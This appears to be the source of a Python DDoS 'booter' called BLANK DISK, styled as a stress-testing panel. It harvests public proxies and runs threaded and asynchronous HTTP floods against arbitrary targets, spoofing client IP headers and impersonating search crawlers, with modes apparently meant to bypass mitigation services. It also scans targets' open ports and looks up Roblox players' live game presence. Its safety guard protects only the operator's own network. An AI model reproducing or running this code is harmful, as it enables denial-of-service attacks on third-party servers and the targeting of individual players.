#!/usr/bin/env python3
"""
BLANK DISK — Stress Testing Control Panel v3.0.0
OWNED BY XRV — THIS MEANS NOT FOR YOU
"""
from __future__ import annotations
import asyncio, socket, random, time, sys, os, threading, ipaddress, inspect, struct, textwrap
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional, Set, Callable
import urllib.request

try:
    import aiohttp
    HAS_AIOHTTP = True
except Exception:
    aiohttp = None
    HAS_AIOHTTP = False

VERSION = "5.5.0"
OWNER = "XRV"
OWNER_MARK = "OWNED BY XRV — BLANK DISK"
_XRV_SEAL = "XRV::LOSTSTAR::SEAL::7f3a9c2e"

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# UI themes — switch with [97]
THEMES = {
    "mrrobot": {
        "name": "MR ROBOT",
        "accent": "\033[38;5;82m",
        "dim": "\033[38;5;242m",
        "alert": "\033[38;5;196m",
        "white": "\033[97m",
        "mid": "\033[38;5;114m",
        "ok": "\033[38;5;46m",
        "warn": "\033[38;5;226m",
    },
    "void": {
        "name": "VOID",
        "accent": "\033[38;5;45m",
        "dim": "\033[38;5;238m",
        "alert": "\033[38;5;201m",
        "white": "\033[97m",
        "mid": "\033[38;5;39m",
        "ok": "\033[38;5;51m",
        "warn": "\033[38;5;213m",
    },
    "amber": {
        "name": "AMBER",
        "accent": "\033[38;5;214m",
        "dim": "\033[38;5;94m",
        "alert": "\033[38;5;160m",
        "white": "\033[97m",
        "mid": "\033[38;5;208m",
        "ok": "\033[38;5;178m",
        "warn": "\033[38;5;220m",
    },
    "ice": {
        "name": "ICE",
        "accent": "\033[38;5;159m",
        "dim": "\033[38;5;66m",
        "alert": "\033[38;5;203m",
        "white": "\033[97m",
        "mid": "\033[38;5;123m",
        "ok": "\033[38;5;87m",
        "warn": "\033[38;5;229m",
    },
    "blood": {
        "name": "BLOOD",
        "accent": "\033[38;5;196m",
        "dim": "\033[38;5;52m",
        "alert": "\033[38;5;124m",
        "white": "\033[97m",
        "mid": "\033[38;5;167m",
        "ok": "\033[38;5;203m",
        "warn": "\033[38;5;210m",
    },
    "pink": {
        "name": "PINK",
        "accent": "\033[38;5;213m",
        "dim": "\033[38;5;96m",
        "alert": "\033[38;5;199m",
        "white": "\033[97m",
        "mid": "\033[38;5;218m",
        "ok": "\033[38;5;212m",
        "warn": "\033[38;5;219m",
    },
    "galaxy": {
        "name": "GALAXY",
        "accent": "\033[38;5;141m",
        "dim": "\033[38;5;60m",
        "alert": "\033[38;5;177m",
        "white": "\033[97m",
        "mid": "\033[38;5;147m",
        "ok": "\033[38;5;135m",
        "warn": "\033[38;5;183m",
    },
    "toxic": {
        "name": "TOXIC",
        "accent": "\033[38;5;118m",
        "dim": "\033[38;5;58m",
        "alert": "\033[38;5;190m",
        "white": "\033[97m",
        "mid": "\033[38;5;154m",
        "ok": "\033[38;5;46m",
        "warn": "\033[38;5;226m",
    },
    "ocean": {
        "name": "OCEAN",
        "accent": "\033[38;5;39m",
        "dim": "\033[38;5;24m",
        "alert": "\033[38;5;33m",
        "white": "\033[97m",
        "mid": "\033[38;5;45m",
        "ok": "\033[38;5;51m",
        "warn": "\033[38;5;81m",
    },
    "mono": {
        "name": "MONO",
        "accent": "\033[38;5;255m",
        "dim": "\033[38;5;240m",
        "alert": "\033[38;5;250m",
        "white": "\033[97m",
        "mid": "\033[38;5;252m",
        "ok": "\033[38;5;255m",
        "warn": "\033[38;5;248m",
    },
    "lava": {
        "name": "LAVA",
        "accent": "\033[38;5;202m",
        "dim": "\033[38;5;52m",
        "alert": "\033[38;5;160m",
        "white": "\033[97m",
        "mid": "\033[38;5;208m",
        "ok": "\033[38;5;214m",
        "warn": "\033[38;5;220m",
    },
    "mint": {
        "name": "MINT",
        "accent": "\033[38;5;121m",
        "dim": "\033[38;5;65m",
        "alert": "\033[38;5;85m",
        "white": "\033[97m",
        "mid": "\033[38;5;158m",
        "ok": "\033[38;5;120m",
        "warn": "\033[38;5;193m",
    },
}
ACTIVE_THEME = ["mrrobot"]

def apply_theme(name: str):
    """Repaint C.* palette from THEMES — actually changes on-screen colors."""
    if name not in THEMES:
        name = "mrrobot"
    ACTIVE_THEME[0] = name
    th = THEMES[name]
    C.NEON = th["accent"]
    C.ASH = th["dim"]
    C.FIRE1 = th["alert"]
    C.FIRE2 = th.get("mid", th["accent"])
    C.FIRE3 = th.get("mid", th["accent"])
    C.W = th["white"]
    C.G = th.get("ok", th["accent"])
    C.Y = th.get("warn", th["accent"])
    C.R = th["alert"]
    C.B = th.get("mid", th["accent"])
    C.STEEL = th["dim"]
    C.BOLD = "\033[1m"
    C.END = "\033[0m"
    C.D = th["dim"]



class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; W="\033[97m"; D="\033[90m"
    BOLD="\033[1m"; END="\033[0m"
    FIRE1="\033[38;5;196m"; FIRE2="\033[38;5;202m"; FIRE3="\033[38;5;208m"; FIRE4="\033[38;5;214m"
    NEON="\033[38;5;51m"; ASH="\033[38;5;240m"; STEEL="\033[38;5;250m"; BLOOD="\033[38;5;124m"

def clear():
    os.system("cls" if os.name=="nt" else "clear")



BANNER = ""


def loading_screen():
    apply_theme(ACTIVE_THEME[0])
    width, height = 78, 24
    glyphs = list("01アイウエオカキクケコ░▒▓█#@$%*+<>/")
    phrases = [
        "hello, friend",
        "control is an illusion",
        "we are finally free",
        "blank disk mounting",
        "fsociety rootkit online",
    ]
    for phase in range(16):
        clear()
        # full screen matrix rain
        for row in range(height):
            line = ""
            for col in range(width):
                dens = 0.1 + phase * 0.015
                if row == height // 2 and 20 < col < 58:
                    dens = 0.0
                if random.random() < dens:
                    line += random.choice(glyphs)
                else:
                    line += " "
            print(f"{C.NEON}{line}{C.END}")
        # center message overwrite feel
        msg = phrases[phase % len(phrases)]
        print(f"\033[{height//2};{max(1,(width-len(msg))//2)}H{C.W}{C.BOLD}{msg}{C.END}")
        bar = "█" * (phase + 1) + "░" * (16 - phase - 1)
        print(f"\033[{height};1H{C.ASH}   [{C.NEON}{bar}{C.ASH}] {(phase+1)*100//16}%  blank disk boot{C.END}")
        time.sleep(0.11)
    clear()
    print(get_banner())
    print()
    steps = [
        "opening root shell",
        "loading exploit chain",
        "binding proxy mesh",
        "arming soft area",
        "router shield check",
        "fsociety online",
    ]
    for i, name in enumerate(steps):
        pct = int((i + 1) / len(steps) * 100)
        bar = "█" * (i + 1) + "░" * (len(steps) - i - 1)
        sys.stdout.write(f"\r   {C.NEON}>{C.END} {C.STEEL}{name:<22}{C.END} [{C.NEON}{bar}{C.END}] {pct:3d}%")
        sys.stdout.flush()
        time.sleep(0.1)
    print()
    print(f"\n   {C.G}{C.BOLD}hello, friend.  BLANK DISK {VERSION} ready.{C.END}\n")
    time.sleep(0.35)

def get_banner():
    import base64
    rows = base64.b64decode('ICAgICAgX19fICAgICAgICAgICBfX18gICAgICAgX19fICAgICAgICAgICBfX18gICAgICAgICAgIF9fXyAgICAgICAgICAgICAgICAgICAgX19fICAgICAgICAgICAgICAgICAgICAgICBfX18gICAgICAgICAgIF9fXyAgICAgCiAgICAgL1wgIFwgICAgICAgICAvXF9fXCAgICAgL1wgIFwgICAgICAgICAvXF9fXCAgICAgICAgIC9cX19cICAgICAgICAgICAgICAgICAgL1wgIFwgICAgICAgICAgX19fICAgICAgICAvXCAgXCAgICAgICAgIC9cX19cICAgIAogICAgLzo6XCAgXCAgICAgICAvOi8gIC8gICAgLzo6XCAgXCAgICAgICAvOjp8ICB8ICAgICAgIC86LyAgLyAgICAgICAgICAgICAgICAgLzo6XCAgXCAgICAgICAgL1wgIFwgICAgICAvOjpcICBcICAgICAgIC86LyAgLyAgICAKICAgLzovXDpcICBcICAgICAvOi8gIC8gICAgLzovXDpcICBcICAgICAvOnw6fCAgfCAgICAgIC86L19fLyAgICAgICAgICAgICAgICAgLzovXDpcICBcICAgICAgIFw6XCAgXCAgICAvOi9cIFwgIFwgICAgIC86L19fLyAgICAgCiAgLzo6XH5cOlxfX1wgICAvOi8gIC8gICAgLzo6XH5cOlwgIFwgICAvOi98OnwgIHxfXyAgIC86OlwgIFxfX19fICAgICAgICAgICAgLzovICBcOlxfX1wgICAgICAvOjpcX19cICBfXDpcflwgXCAgXCAgIC86OlwgIFxfX19fIAogLzovXDpcIFw6fF9ffCAvOi9fXy8gICAgLzovXDpcIFw6XF9fXCAvOi8gfDp8IC9cX19cIC86L1w6Ojo6OlxfX1wgICAgICAgICAgLzovX18vIFw6fF9ffCAgX18vOi9cL19fLyAvXCBcOlwgXCBcX19cIC86L1w6Ojo6OlxfX1wKIFw6XH5cOlwvOi8gIC8gXDpcICBcICAgIFwvX19cOlwvOi8gIC8gXC9fX3w6fC86LyAgLyBcL198Onx+fnx+ICAgICAgICAgICAgIFw6XCAgXCAvOi8gIC8gL1wvOi8gIC8gICAgXDpcIFw6XCBcL19fLyBcL198Onx+fnx+ICAgCiAgXDpcIFw6Oi8gIC8gICBcOlwgIFwgICAgICAgIFw6Oi8gIC8gICAgICB8Oi86LyAgLyAgICAgfDp8ICB8ICAgICAgICAgICAgICAgXDpcICAvOi8gIC8gIFw6Oi9fXy8gICAgICBcOlwgXDpcX19cICAgICAgfDp8ICB8ICAgIAogICBcOlwvOi8gIC8gICAgIFw6XCAgXCAgICAgICAvOi8gIC8gICAgICAgfDo6LyAgLyAgICAgIHw6fCAgfCAgICAgICAgICAgICAgICBcOlwvOi8gIC8gICAgXDpcX19cICAgICAgIFw6XC86LyAgLyAgICAgIHw6fCAgfCAgICAKICAgIFw6Oi9fXy8gICAgICAgXDpcX19cICAgICAvOi8gIC8gICAgICAgIC86LyAgLyAgICAgICB8OnwgIHwgICAgICAgICAgICAgICAgIFw6Oi9fXy8gICAgICBcL19fLyAgICAgICAgXDo6LyAgLyAgICAgICB8OnwgIHwgICAgCiAgICAgfn4gICAgICAgICAgICBcL19fLyAgICAgXC9fXy8gICAgICAgICBcL19fLyAgICAgICAgIFx8X198ICAgICAgICAgICAgICAgICAgfn4gICAgICAgICAgICAgICAgICAgICAgICBcL19fLyAgICAgICAgIFx8X198ICAgIA==').decode().split(chr(10))
    return f'{C.NEON}{C.BOLD}' + chr(10) + chr(10).join(rows) + chr(10) + f'{C.END}' + chr(10) + f'{C.ASH}  blank disk · v{VERSION} · owned by xrv · not for you{C.END}' + chr(10)


class SafetyGuard:
    PRIVATE=[ipaddress.ip_network(n) for n in [
        "0.0.0.0/8","10.0.0.0/8","100.64.0.0/10","127.0.0.0/8","169.254.0.0/16",
        "172.16.0.0/12","192.168.0.0/16","224.0.0.0/4","240.0.0.0/4"]]
    SOFT_MAX_PPS=400; SOFT_MAX_HTTP=30; SOFT_MAX_TCP=30; SOFT_MAX_SLOW=30; SOFT_MAX_UDP_TH=6
    HARD_PPS=2000; HARD_HTTP=200; HARD_TCP=150
    def __init__(self):
        self.local_ips:Set[str]=set()
        self.gateway_ips:Set[str]=set()
        self.public_ips:Set[str]=set()
        self.protected_nets:List= []  # ip_network objects for LAN ranges
        self.soft_mode=True
        self.router_shield=True  # ON = never target private/gateway/self
        self._detect()
    def register_public(self, ip:str):
        if not ip: return
        ip=str(ip).strip()
        if ip:
            self.public_ips.add(ip)
    def _detect(self):
        self.local_ips.update({"127.0.0.1","::1","0.0.0.0","localhost"})
        lan=None
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(1.0)
            s.connect(("8.8.8.8",80)); lan=s.getsockname()[0]; self.local_ips.add(lan); s.close()
        except Exception:
            pass
        try:
            hn=socket.gethostbyname(socket.gethostname())
            if not hn.startswith("127."):
                self.local_ips.add(hn)
        except Exception:
            pass
        self.gateway_ips.update({"192.168.0.1","192.168.1.1","192.168.1.254","10.0.0.1","10.0.0.138"})
        if lan:
            try:
                parts=lan.split(".")
                if len(parts)==4:
                    self.gateway_ips.add(".".join(parts[:3]+["1"]))
                    self.gateway_ips.add(".".join(parts[:3]+["254"]))
                    # protect whole LAN as a network — do NOT expand to 254 strings
                    net = ipaddress.ip_network(".".join(parts[:3]+["0"])+"/24", strict=False)
                    self.protected_nets.append(net)
            except Exception:
                pass
    def _is_protected_ip(self, ip_str:str)->bool:
        if ip_str in self.local_ips or ip_str in self.gateway_ips or ip_str in self.public_ips:
            return True
        try:
            ip=ipaddress.ip_address(ip_str)
        except Exception:
            return False
        if any(ip in n for n in self.PRIVATE):
            return True
        if any(ip in n for n in self.protected_nets):
            return True
        return False
    def is_safe(self, target:str)->bool:
        # Router shield ON → block private/gateway/self so home line stays up
        # Router shield OFF → allow (you can hit anything; can knock yourself offline)
        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0].strip().lower()
        if host in ("localhost","0.0.0.0","::1"):
            return False  # always refuse pure loopback
        if not getattr(self, "router_shield", True):
            return True
        if host in self.local_ips or host in self.gateway_ips:
            return False
        try:
            ip=ipaddress.ip_address(host)
            if str(ip) in self.local_ips or str(ip) in self.gateway_ips:
                return False
            return not any(ip in n for n in self.PRIVATE)
        except ValueError:
            try:
                resolved=socket.gethostbyname(host)
                if resolved in self.local_ips or resolved in self.gateway_ips:
                    return False
                ip=ipaddress.ip_address(resolved)
                return not any(ip in n for n in self.PRIVATE)
            except Exception:
                return True


    def lock_summary(self)->str:
        """Short status line — never dump /24 host list."""
        bits=[]
        if self.local_ips:
            # show only non-range hosts (max few)
            show=sorted(x for x in self.local_ips if x not in ("0.0.0.0","localhost"))[:4]
            bits.append(", ".join(show))
        if self.protected_nets:
            bits.append("nets "+ ",".join(str(n) for n in self.protected_nets))
        if self.public_ips:
            bits.append("WAN "+ ",".join(sorted(self.public_ips)))
        if self.gateway_ips:
            bits.append("gw "+ ",".join(sorted(self.gateway_ips)[:3]))
        return " | ".join(bits) if bits else "..."
    def cap_pps(self,n):
        n = max(1, int(n))
        if self.soft_mode:
            return min(n, self.SOFT_MAX_PPS, self.HARD_PPS)
        return min(n, self.HARD_PPS)
    def cap_http(self,n):
        n=max(1,int(n))
        return min(n, self.SOFT_MAX_HTTP if self.soft_mode else self.HARD_HTTP, self.HARD_HTTP)
    def cap_tcp(self,n):
        n=max(1,int(n))
        return min(n, self.SOFT_MAX_TCP if self.soft_mode else self.HARD_TCP, self.HARD_TCP)
    def cap_slow(self,n):
        return max(1,min(n,self.SOFT_MAX_SLOW)) if self.soft_mode else max(1,n)


# ── PROXY ──────────────────────────────────────────────
class ProxyPool:
    def __init__(self):
        self.proxies:List[str]=[]; self.working:List[str]=[]; self.lock=threading.Lock()
    def _pull(self,url:str)->Set[str]:
        got:Set[str]=set()
        try:
            req=urllib.request.Request(url,headers={"User-Agent":random.choice(USER_AGENTS)})
            with urllib.request.urlopen(req,timeout=4) as r:
                for line in r.read().decode("utf-8","ignore").splitlines():
                    line=line.strip()
                    if ":" in line and not line.startswith("#"):
                        a,b=line.split(":",1)
                        if b.isdigit() and 1<=int(b)<=65535: got.add(line)
        except Exception: pass
        return got
    def _probe(self,proxy:str)->bool:
        try:
            h,p=proxy.split(":")
            s=socket.socket(); s.settimeout(3.5)
            s.connect((h,int(p)))
            s.close()
            return True
        except Exception:
            return False
    def fetch(self)->int:
        print(f"{C.Y}[*] Fetching proxies...{C.END}"); found:Set[str]=set()
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs={ex.submit(self._pull,u):u for u in PROXY_SOURCES}
            for i,fut in enumerate(as_completed(futs,timeout=20),1):
                u=futs[fut]; short=u.split("/")[2] if "://" in u else u[:28]
                try:
                    c=fut.result(); found.update(c)
                    print(f"  {C.G}✓{C.END} {short:<28} +{len(c):,}")
                except Exception:
                    print(f"  {C.R}✗{C.END} {short:<28} fail")
        with self.lock: self.proxies=list(found); self.working=[]
        print(f"{C.G}[+] Loaded {len(self.proxies):,}{C.END}")
        if self.proxies: self.validate(150)
        return len(self.proxies)
    def validate(self,sample=150)->int:
        with self.lock: cands=list(self.proxies)
        random.shuffle(cands); sample_list=cands[:min(sample,len(cands))]
        print(f"{C.Y}[*] Probing {len(sample_list)}...{C.END}"); live=[]
        with ThreadPoolExecutor(max_workers=40) as ex:
            futs={ex.submit(self._probe,p):p for p in sample_list}
            for fut in as_completed(futs,timeout=25):
                try:
                    if fut.result(): live.append(futs[fut])
                except Exception: pass
        with self.lock:
            self.working=live
            if live: self.proxies=live+[x for x in self.proxies if x not in live]
        print(f"{C.G}[+] {len(live)} live{C.END}"); return len(live)
    def get(self)->Optional[str]:
        with self.lock:
            # only return probed-live proxies — dead pool was the main fail source
            if self.working:
                return random.choice(self.working)
            return None
    def mark_good(self,p):
        with self.lock:
            if p not in self.working: self.working.append(p)
            if len(self.working)>500: self.working=self.working[-400:]
    def mark_bad(self,p):
        with self.lock:
            if p in self.working:
                try: self.working.remove(p)
                except ValueError: pass

def parse_host_port(target: str, default_port: int = 80):
    """Accept IP, hostname, domain (.net/.com/...), URL, or host:port."""
    s = target.strip()
    s = s.replace("http://", "").replace("https://", "")
    s = s.split("/")[0].split("?")[0].strip()
    host, port = s, default_port
    if s.startswith("[") and "]" in s:
        # [ipv6]:port
        bracket, rest = s[1:].split("]", 1)
        host = bracket
        if rest.startswith(":") and rest[1:].isdigit():
            port = int(rest[1:])
    elif s.count(":") == 1:
        h, p = s.rsplit(":", 1)
        if p.isdigit():
            host, port = h, int(p)
    return host, port


def public_ip_lookup(query: str):
    """Resolve hostname and fetch public geo/org via ip-api (no key)."""
    import urllib.request, json
    host, port_hint = parse_host_port(query.strip(), 0)
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        return {"ok": False, "error": f"resolve failed: {e}", "host": host}
    out = {"ok": False, "host": host, "query": ip, "port_hint": port_hint or None}
    try:
        url = (
            f"http://ip-api.com/json/{ip}"
            "?fields=status,message,continent,continentCode,country,countryCode,"
            "region,regionName,city,district,zip,lat,lon,timezone,offset,"
            "currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        )
        with urllib.request.urlopen(url, timeout=10) as r:
            data = json.loads(r.read().decode())
        out.update(data)
        out["ok"] = data.get("status") == "success"
    except Exception as e:
        out["error"] = str(e)
        return out
    # reverse DNS
    try:
        out["ptr"] = socket.gethostbyaddr(ip)[0]
    except Exception:
        out["ptr"] = out.get("reverse") or "-"
    # light common-port probe (connect only — info, not a flood)
    common = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 8080, 8443, 25565, 27015, 30120]
    if port_hint:
        common = [port_hint] + [c for c in common if c != port_hint]
    open_ports = []
    for pt in common:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.45)
        try:
            if s.connect_ex((ip, pt)) == 0:
                open_ports.append(pt)
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
    out["open_ports"] = open_ports
    return out


def roblox_user_lookup(username_or_id: str):
    """Public Roblox user API — username/id → profile fields (no private IP)."""
    import urllib.request, json
    q = username_or_id.strip()
    headers = {"User-Agent": "LostStar/4.5", "Content-Type": "application/json"}
    try:
        if q.isdigit():
            uid = int(q)
        else:
            req = urllib.request.Request(
                "https://users.roblox.com/v1/usernames/users",
                data=json.dumps({"usernames": [q], "excludeBannedUsers": False}).encode(),
                headers=headers,
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                body = json.loads(r.read().decode())
            data = body.get("data") or []
            if not data:
                return {"ok": False, "error": "user not found"}
            uid = data[0].get("id")
        req2 = urllib.request.Request(f"https://users.roblox.com/v1/users/{uid}", headers=headers)
        with urllib.request.urlopen(req2, timeout=10) as r:
            prof = json.loads(r.read().decode())
        # presence (public)
        presence = {}
        try:
            req3 = urllib.request.Request(
                "https://presence.roblox.com/v1/presence/users",
                data=json.dumps({"userIds": [uid]}).encode(),
                headers=headers,
                method="POST",
            )
            with urllib.request.urlopen(req3, timeout=10) as r:
                pres = json.loads(r.read().decode())
            plist = pres.get("userPresences") or []
            if plist:
                presence = plist[0]
        except Exception:
            pass
        return {
            "ok": True,
            "id": prof.get("id"),
            "name": prof.get("name"),
            "display": prof.get("displayName"),
            "created": prof.get("created"),
            "bio": (prof.get("description") or "")[:120],
            "banned": prof.get("isBanned"),
            "presence": presence.get("userPresenceType"),
            "lastLocation": presence.get("lastLocation"),
            "placeId": presence.get("placeId"),
            "gameId": presence.get("gameId"),
            "universeId": presence.get("universeId"),
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

def p2p_endpoint_lookup(host: str):
    """P2P-style endpoint report: resolve + geo + common game/VPN ports (public info only)."""
    data = public_ip_lookup(host)
    if not data.get("ok"):
        return data
    # extra peer-oriented ports
    ip = data.get("query")
    extra = [3074, 3478, 3544, 4500, 500, 1194, 51820, 7777, 7778, 27015, 27016, 30120, 22122]
    more = []
    for pt in extra:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        try:
            if s.connect_ex((ip, pt)) == 0:
                more.append(pt)
        except Exception:
            pass
        finally:
            try: s.close()
            except Exception: pass
    ports = list(dict.fromkeys((data.get("open_ports") or []) + more))
    data["open_ports"] = ports
    data["p2p_note"] = "Endpoint fingerprint only — cannot reveal other players' home IPs from a username."
    return data

def discord_snowflake_info(snowflake: str):
    """Decode Discord snowflake → creation time (public algorithm, not a user DB)."""
    try:
        sid = int(snowflake.strip())
        ts = (sid >> 22) + 1420070400000
        from datetime import datetime, timezone
        created = datetime.fromtimestamp(ts / 1000, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        return {"ok": True, "id": str(sid), "created": created}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def resolve_target(target: str):
    host, _ = parse_host_port(target, 0)
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host
    label = host if len(host) <= 28 else host[:25] + "..."
    return ip, label

def resolve_mc_target(target: str):
    """Minecraft: accept play.example.net, example.com:25565, raw IP."""
    host, port = parse_host_port(target, 25565)
    if port == 0:
        port = 25565
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host
    return ip, host, port

# ── METHODS ────────────────────────────────────────────
class Methods:
    def __init__(self, pool:ProxyPool, safety:SafetyGuard):
        self.pool=pool; self.safety=safety; self.running=False
        self.stats={"sent":0,"success":0,"fail":0,"start":0,"method":""}
        self.recent:List[str]=[]; self.target_label=("",""); self._lock=threading.Lock()
    def _inc(self,k,n=1):
        with self._lock: self.stats[k]+=n
    def stop(self): self.running=False

    # L7 HTTP family

    
    def http_flood_sync(self, target, duration, concurrency, mode="get"):
        """Reliable L7 via stdlib urllib — works offline from aiohttp, proxy optional."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        import urllib.request
        import urllib.error
        import ssl
        url = target if str(target).startswith("http") else f"http://{target}"
        concurrency = max(1, int(self.safety.cap_http(concurrency)))
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": f"L7-{str(mode).upper()}"}
        end = time.time() + duration
        lock = threading.Lock()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        def one():
            while self.running and time.time() < end:
                proxy = self.pool.get()
                try:
                    method = "POST" if str(mode) in ("post", "stress", "apache", "xmlrpc") else "GET"
                    data = random.randbytes(64) if method == "POST" else None
                    req = urllib.request.Request(url, data=data, method=method)
                    req.add_header("User-Agent", random.choice(USER_AGENTS))
                    req.add_header("Accept", "*/*")
                    req.add_header("Connection", "close")
                    if data is not None:
                        req.add_header("Content-Length", str(len(data)))
                    handlers = [urllib.request.HTTPSHandler(context=ctx)]
                    if proxy:
                        handlers.insert(0, urllib.request.ProxyHandler({
                            "http": f"http://{proxy}",
                            "https": f"http://{proxy}",
                        }))
                    opener = urllib.request.build_opener(*handlers)
                    try:
                        with opener.open(req, timeout=8) as resp:
                            try:
                                resp.read(128)
                            except Exception:
                                pass
                        ok = True
                    except urllib.error.HTTPError:
                        ok = True  # got HTTP answer
                    except Exception:
                        ok = False
                    with lock:
                        self.stats["sent"] += 1
                        if ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["fail"] += 1
                    if proxy:
                        if ok:
                            self.pool.mark_good(proxy)
                        else:
                            self.pool.mark_bad(proxy)
                except Exception:
                    with lock:
                        self.stats["sent"] += 1
                        self.stats["fail"] += 1
                time.sleep(0.005)

        ths = [threading.Thread(target=one, daemon=True) for _ in range(concurrency)]
        for th in ths:
            th.start()
        for th in ths:
            th.join(timeout=duration + 5)
        self.running = False

    async def _http_generic(self, target, duration, concurrency, mode:str):
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        url = target if target.startswith("http") else f"http://{target}"
        self.running=True
        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":f"L7-{mode.upper()}"}
        end=time.time()+duration
        conc=self.safety.cap_http(concurrency)
        connector=aiohttp.TCPConnector(limit=0,ssl=False,ttl_dns_cache=60,enable_cleanup_closed=True)
        timeout=aiohttp.ClientTimeout(total=12,connect=5,sock_read=6)
        fail_streak={}

        def headers_for(m):
            h={"Accept":"*/*","Accept-Language":"en-US,en;q=0.9","Cache-Control":"no-cache","Connection":"keep-alive"}
            if m=="null":
                h["User-Agent"]=""; h["Accept"]=""; h["Accept-Language"]=""
            elif m=="bot":
                h["User-Agent"]="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            elif m=="cookie":
                h["User-Agent"]=random.choice(USER_AGENTS)
                h["Cookie"]=f"session={random.randbytes(16).hex()}; id={random.randint(1,999999)}"
            elif m in ("cfb","cfbuam","bypass","ovh","dgb","avb","gsb","stomp"):
                h["User-Agent"]=random.choice(USER_AGENTS)
                h["Referer"]=f"https://www.google.com/search?q={random.randint(1000,9999)}"
                h["X-Forwarded-For"]=f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                h["X-Real-IP"]=h["X-Forwarded-For"]
                if m=="cfbuam": h["CF-Connecting-IP"]=h["X-Forwarded-For"]
            elif m=="even":
                h["User-Agent"]=random.choice(USER_AGENTS)
                h["Accept-Encoding"]="gzip, deflate, br"; h["Upgrade-Insecure-Requests"]="1"
            else:
                h["User-Agent"]=random.choice(USER_AGENTS)
            return h

        def url_for(m, base):
            if m=="dyn":
                sub=f"{random.randbytes(4).hex()}"
                if "://" in base:
                    scheme,rest=base.split("://",1); host=rest.split("/")[0]
                    return f"{scheme}://{sub}.{host}/"
                return f"http://{sub}.{base}/"
            if m=="xmlrpc":
                return base.rstrip("/")+"/xmlrpc.php"
            if m=="rhex":
                return base.rstrip("/")+"/"+random.randbytes(8).hex()
            return base


        async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
            async def worker():
                while self.running and time.time()<end:
                    proxy=self.pool.get()
                    hdrs=headers_for(mode)
                    u=url_for(mode,url)
                    try:
                        kw={"headers":hdrs,"allow_redirects":True, "ssl": False}
                        if proxy:
                            kw["proxy"]=f"http://{proxy}"
                        # if no live proxy, go direct (still session-isolated per request)
                        if mode in ("post","stress","apache"):
                            body=random.randbytes(random.randint(64,2048) if mode=="stress" else 64)
                            async with session.post(u,data=body,**kw) as resp:
                                _ = resp.status
                                try: await resp.content.read(256)
                                except Exception: pass
                        elif mode=="head":
                            async with session.head(u,**kw) as resp:
                                _ = resp.status
                        elif mode=="downloader":
                            async with session.get(u,**kw) as resp:
                                _ = resp.status
                                async for _c in resp.content.iter_chunked(64):
                                    await asyncio.sleep(0.02)
                                    break
                        else:
                            async with session.get(u,**kw) as resp:
                                _ = resp.status
                                try: await resp.content.read(256)
                                except Exception: pass
                        self._inc("sent"); self._inc("success")
                        if proxy:
                            self.pool.mark_good(proxy); fail_streak[proxy]=0
                    except Exception:
                        self._inc("sent"); self._inc("fail")
                        if proxy:
                            fail_streak[proxy]=fail_streak.get(proxy,0)+1
                            if fail_streak[proxy]>=2:
                                self.pool.mark_bad(proxy)
                    await asyncio.sleep(0)
            tasks=[asyncio.create_task(worker()) for _ in range(conc)]
            try: await asyncio.gather(*tasks, return_exceptions=True)
            finally:
                for tsk in tasks:
                    if not tsk.done(): tsk.cancel()
                await connector.close()
        self.running=False


    async def http_get(self,t,d,c): await self._http_generic(t,d,c,"get")
    async def http_post(self,t,d,c): await self._http_generic(t,d,c,"post")
    async def http_head(self,t,d,c): await self._http_generic(t,d,c,"head")
    async def http_null(self,t,d,c): await self._http_generic(t,d,c,"null")
    async def http_cookie(self,t,d,c): await self._http_generic(t,d,c,"cookie")
    async def http_pps(self,t,d,c): await self._http_generic(t,d,c,"pps")
    async def http_even(self,t,d,c): await self._http_generic(t,d,c,"even")
